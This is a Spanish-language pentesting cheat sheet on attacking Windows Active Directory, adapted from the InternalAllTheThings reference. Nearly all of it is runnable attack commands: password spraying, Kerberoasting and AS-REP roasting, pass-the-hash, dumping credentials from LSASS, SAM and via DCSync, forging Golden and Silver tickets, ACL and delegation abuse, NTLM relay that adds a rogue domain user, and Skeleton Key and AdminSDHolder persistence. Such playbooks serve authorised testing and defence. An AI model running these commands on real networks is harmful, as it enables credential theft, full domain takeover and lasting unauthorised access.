---
tags:
  - post-explotacion
  - active-directory
  - windows
  - pentesting
  - kerberos
aliases:
  - AD Attacks
  - Active Directory
fuente: "https://swisskyrepo.github.io/InternalAllTheThings/active-directory/ad-introduction/"
licencia: MIT
---

# Active Directory — Ataques

> [!warning] Uso ético y autorizado. Ver [[📜 Fuentes y Licencias]].

Active Directory (AD) es el servicio de directorio de Microsoft para gestionar identidades y recursos en redes Windows corporativas. Un dominio AD comprometido implica control total sobre usuarios, equipos y políticas de la organización.

---

## Conceptos clave

| Término | Descripción |
|---------|-------------|
| DC | Domain Controller — servidor que ejecuta AD DS |
| DN / FQDN | Distinguished Name / nombre completo de dominio |
| LDAP | Protocolo de consulta al directorio (puerto 389 / 636 TLS) |
| Kerberos | Protocolo de autenticación de AD (puerto 88) |
| SMB | Protocolo de red para compartir recursos (puerto 445) |
| NTLM | Protocolo de autenticación legacy (hash de contraseña) |
| TGT / TGS | Ticket Granting Ticket / Service Ticket (Kerberos) |
| SPN | Service Principal Name — identifica un servicio en AD |
| GPO | Group Policy Object — políticas aplicadas a OUs |
| ACL / ACE | Listas de control de acceso / entradas individuales |

---

## Enumeración

### Con credenciales (desde Linux)

```bash
# Enumeración general con enum4linux-ng
enum4linux-ng -A <DC_IP>

# LDAP — dump completo
ldapsearch -x -H ldap://<DC_IP> -D "<usuario>@<dominio>" -w '<pass>' -b "DC=corp,DC=local"

# Usuarios del dominio
impacket-GetADUsers -all <dominio>/<usuario>:<pass> -dc-ip <DC_IP>

# Grupos y miembros
impacket-net <dominio>/<usuario>:<pass> -dc-ip <DC_IP> group

# Resolución DNS del DC
nslookup -type=SRV _ldap._tcp.dc._msdcs.<dominio>
```

### Con BloodHound / SharpHound

```bash
# Recolección desde Windows (SharpHound)
.\SharpHound.exe -c All --zipfilename loot.zip

# Recolección desde Linux (bloodhound-python)
bloodhound-python -u <usuario> -p '<pass>' -d <dominio> -ns <DC_IP> -c All

# Iniciar Neo4j y BloodHound
sudo neo4j start
bloodhound &
# Importar el ZIP → explorar rutas de ataque
```

### Consultas útiles en BloodHound

- `Shortest Paths to Domain Admins`
- `Find Principals with DCSync Rights`
- `Computers where Domain Users are Local Admin`
- `Kerberoastable Accounts`
- `AS-REP Roastable Users`

---

## Ataques de contraseña

### Password Spraying

```bash
# CrackMapExec — un intento por usuario (evitar lockout)
crackmapexec smb <DC_IP> -u users.txt -p 'Password1' --continue-on-success

# Kerbrute — más sigiloso (Kerberos)
./kerbrute passwordspray -d <dominio> users.txt 'Password1' --dc <DC_IP>
```

### AS-REP Roasting

Usuarios con `Do not require Kerberos preauthentication` — se puede solicitar TGT sin contraseña y crackearlo offline.

```bash
# Obtener hashes AS-REP (sin credenciales)
impacket-GetNPUsers <dominio>/ -usersfile users.txt -no-pass -dc-ip <DC_IP>

# Con credenciales válidas
impacket-GetNPUsers <dominio>/<usuario>:<pass> -dc-ip <DC_IP> -request

# Crackear con hashcat
hashcat -m 18200 asrep.txt wordlist.txt
```

### Kerberoasting

Usuarios con SPN registrado — el TGS cifrado con la contraseña del servicio se puede crackear offline.

```bash
# Obtener TGS (requiere autenticación)
impacket-GetUserSPNs <dominio>/<usuario>:<pass> -dc-ip <DC_IP> -request -outputfile kerberoast.txt

# Crackear
hashcat -m 13100 kerberoast.txt wordlist.txt

# Desde Windows (Rubeus)
.\Rubeus.exe kerberoast /outfile:tgs.txt
```

---

## Pass-the-Hash / Pass-the-Ticket

### Pass-the-Hash (NTLM)

```bash
# Ejecución remota con hash NTLM
impacket-psexec <dominio>/administrator@<IP> -hashes :<NTLM>
impacket-wmiexec <dominio>/administrator@<IP> -hashes :<NTLM>
impacket-smbexec <dominio>/administrator@<IP> -hashes :<NTLM>

# CrackMapExec
crackmapexec smb <IP> -u administrator -H <NTLM> -x "whoami"
```

### Pass-the-Ticket (Kerberos)

```bash
# Exportar tickets desde Windows (Rubeus)
.\Rubeus.exe dump /nowrap
.\Rubeus.exe ptt /ticket:<base64_ticket>

# Importar ticket en Linux (impacket)
export KRB5CCNAME=/tmp/ticket.ccache
impacket-psexec -k -no-pass <dominio>/<usuario>@<objetivo>
```

---

## Volcado de credenciales

### Secretsdump — volcado remoto

```bash
# Con credenciales / hashes
impacket-secretsdump <dominio>/<usuario>:<pass>@<DC_IP>
impacket-secretsdump -hashes :<NTLM> <dominio>/administrator@<DC_IP>

# Dump local (desde el host comprometido)
impacket-secretsdump -sam sam.save -system system.save -security security.save LOCAL
```

### LSASS (desde Windows comprometido)

```powershell
# Mimikatz — dump de credenciales en memoria
.\mimikatz.exe
privilege::debug
sekurlsa::logonpasswords
lsadump::sam
lsadump::dcsync /domain:<dominio> /user:administrator
```

### Volcado de SAM/SYSTEM

```powershell
reg save HKLM\SAM C:\Temp\sam
reg save HKLM\SYSTEM C:\Temp\system
reg save HKLM\SECURITY C:\Temp\security
# Transferir y procesar con secretsdump LOCAL
```

---

## DCSync

Simula el comportamiento de un DC replicante para obtener hashes de cualquier usuario, incluido `krbtgt`.

```bash
# Requiere permisos: Replicating Directory Changes (All)
impacket-secretsdump <dominio>/<usuario>:<pass>@<DC_IP> -just-dc-user krbtgt
impacket-secretsdump <dominio>/<usuario>:<pass>@<DC_IP> -just-dc

# Desde Windows (Mimikatz)
lsadump::dcsync /domain:<dominio> /user:krbtgt
lsadump::dcsync /domain:<dominio> /all /csv
```

---

## Golden Ticket

Con el hash NTLM de `krbtgt` se puede forjar TGTs válidos para cualquier usuario.

```bash
# Obtener hash krbtgt y SID del dominio primero (DCSync)
impacket-secretsdump <dominio>/administrator:<pass>@<DC_IP> -just-dc-user krbtgt

# Forjar Golden Ticket (impacket)
impacket-ticketer -nthash <KRBTGT_HASH> -domain-sid <SID> -domain <dominio> -user administrator Administrator

# Usar el ticket
export KRB5CCNAME=Administrator.ccache
impacket-psexec -k -no-pass administrator@<DC_FQDN>
```

```powershell
# Desde Windows (Mimikatz)
kerberos::golden /user:administrator /domain:<dominio> /sid:<SID> /krbtgt:<HASH> /ticket:golden.kirbi
kerberos::ptt golden.kirbi
```

---

## Silver Ticket

Forja TGS para un servicio específico usando el hash NTLM de la cuenta de servicio (menor ruido que Golden Ticket).

```bash
# Forjar Silver Ticket para CIFS del DC
impacket-ticketer -nthash <HASH_CUENTA_SERVICIO> -domain-sid <SID> -domain <dominio> \
  -spn cifs/<DC_FQDN> -user administrator Administrator

export KRB5CCNAME=Administrator.ccache
impacket-smbclient -k -no-pass administrator@<DC_FQDN>
```

---

## Ataques a ACLs (abuso de permisos delegados)

Rutas de escalada frecuentes en BloodHound:

| ACE / Permiso | Abuso |
|---------------|-------|
| `GenericAll` sobre usuario | Cambiar contraseña, Kerberoasting |
| `GenericAll` sobre grupo | Añadirse al grupo |
| `GenericWrite` sobre usuario | Escribir SPN → Kerberoasting |
| `GenericWrite` sobre objeto | Shadow Credentials, modificar `scriptPath` |
| `WriteOwner` | Tomar ownership y luego `GenericAll` |
| `WriteDACL` | Añadirse un ACE con `GenericAll` |
| `ForceChangePassword` | Cambiar contraseña sin conocer la actual |

```bash
# Cambiar contraseña con GenericAll (Linux)
impacket-net rpc password "<usuario_objetivo>" "<nueva_pass>" -U "<dominio>/<atacante>%<pass>" -S <DC_IP>

# Añadir usuario a grupo (PowerView)
Add-DomainGroupMember -Identity "Domain Admins" -Members <usuario>

# WriteDACL → añadir DCSync rights (PowerView)
Add-DomainObjectAcl -TargetIdentity "<dominio>" -PrincipalIdentity <usuario> `
  -Rights DCSync -Verbose
```

---

## Abuso de delegación Kerberos

### Unconstrained Delegation

Los equipos con delegación sin restricción guardan TGTs en memoria al conectarse cualquier usuario.

```bash
# Identificar equipos con unconstrained delegation
impacket-findDelegation <dominio>/<usuario>:<pass> -dc-ip <DC_IP>

# Capturar TGT con Rubeus (esperar conexión de DC por PrinterBug)
.\Rubeus.exe monitor /interval:5 /filteruser:DC$
# Forzar autenticación del DC (SpoolSample / printerbug)
.\SpoolSample.exe <DC_IP> <equipo_con_unconstrained>
```

### Constrained Delegation (S4U2Proxy)

```bash
# Identificar cuentas con constrained delegation
impacket-findDelegation <dominio>/<usuario>:<pass> -dc-ip <DC_IP>

# Solicitar TGS para el servicio destino (Rubeus)
.\Rubeus.exe s4u /user:<cuenta_deleg> /rc4:<HASH> /impersonateuser:administrator \
  /msdsspn:"cifs/<objetivo>" /ptt
```

---

## NTLM Relay

Redirige autenticaciones NTLM capturadas hacia otros servicios.

```bash
# Deshabilitar SMB y HTTP en el atacante
# /etc/responder/Responder.conf → SMB = Off, HTTP = Off

# Capturar con Responder
sudo responder -I eth0 -dwP

# Relay con ntlmrelayx (volcar SAM, crear usuario, etc.)
impacket-ntlmrelayx -tf targets.txt -smb2support
impacket-ntlmrelayx -tf targets.txt -smb2support -c "net user hacker P@ss123! /add /domain"

# Combinado con mitm6 (IPv6 — captura WPAD)
sudo mitm6 -d <dominio>
impacket-ntlmrelayx -6 -tf targets.txt -wh wpadattack -smb2support
```

---

## Persistencia en AD

```bash
# Skeleton Key (Mimikatz) — contraseña maestra para todos los usuarios
misc::skeleton
# Cualquier usuario puede autenticarse con "mimikatz" como contraseña

# AdminSDHolder — propagar permisos persistentes
# Añadir ACE en AdminSDHolder; el SDProp los replica cada 60 min a cuentas protegidas
Add-DomainObjectAcl -TargetIdentity "CN=AdminSDHolder,CN=System,DC=corp,DC=local" \
  -PrincipalIdentity <usuario> -Rights All

# DSRM password (acceso de emergencia al DC)
# Habilitar login DSRM desde la red
reg add "HKLM\System\CurrentControlSet\Control\Lsa" /v DsrmAdminLogonBehavior /t REG_DWORD /d 2
impacket-secretsdump <DC_IP> -hashes :<DSRM_HASH> -just-dc
```

---

## Herramientas de referencia

| Herramienta | Uso principal |
|------------|---------------|
| BloodHound / SharpHound | Enumeración y rutas de ataque |
| bloodhound-python | Recolección desde Linux |
| Impacket suite | Autenticación, secretsdump, tickets, relay |
| CrackMapExec | Movimiento lateral, spray, ejecución |
| Rubeus | Kerberos — dump, forge, spray, S4U |
| Mimikatz | Credenciales en memoria, tickets, DCSync |
| Responder | Captura LLMNR/NBT-NS/WPAD |
| mitm6 | IPv6 + WPAD relay |
| kerbrute | Enumeración y spray sobre Kerberos |
| PowerView | Enumeración y abuso de AD desde PowerShell |
| ldapdomaindump | Dump LDAP a HTML/JSON |

---

## Flujo de ataque típico

```
1. Enumeración (BloodHound, enum4linux-ng, ldapdomaindump)
2. Obtener credenciales iniciales
   ├─ AS-REP Roasting (sin credenciales)
   ├─ Password Spraying
   └─ NTLM Relay / Responder
3. Con credenciales válidas
   ├─ Kerberoasting → crackear TGS
   ├─ BloodHound → identificar path a DA
   └─ Abuso de ACLs / delegación
4. Elevar a Domain Admin
   ├─ DCSync → hash krbtgt + administrator
   └─ Golden Ticket → acceso persistente
5. Persistencia (AdminSDHolder, DSRM, Skeleton Key)
```

---

## Referencias
- [[🗺️ MOC Ciberseguridad y Redes]]
- [[Escalada de Privilegios Windows]]
- [[Persistencia Post-Explotación]]
- [[Pivoting de Red]]
- Fuente: [InternalAllTheThings — Active Directory](https://swisskyrepo.github.io/InternalAllTheThings/active-directory/ad-introduction/) — MIT
